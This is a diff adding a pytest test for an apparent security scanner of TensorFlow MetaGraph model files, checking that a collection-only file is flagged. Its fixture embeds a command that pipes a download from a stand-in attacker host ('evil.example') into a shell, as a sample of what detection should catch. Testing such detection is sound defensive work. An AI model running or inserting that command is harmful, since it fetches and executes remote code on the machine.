@@ -215,6 +215,22 @@ def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_lim
     assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
 
 
+def test_tf_metagraph_scanner_inspects_collection_only_metagraph_payload(tmp_path: Path) -> None:
+    collection_only_meta = tmp_path / "collection-only.meta"
+    collection_only_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[],
+            collection_bytes={"runtime_hook": [b"python -c 'curl https://evil.example/collection | sh'"]},
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(collection_only_meta))
+
+    assert result.metadata["graph_node_count"] == 0
+    assert result.metadata["collection_count"] == 1
+    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
+
+
 @pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
 def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
     loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
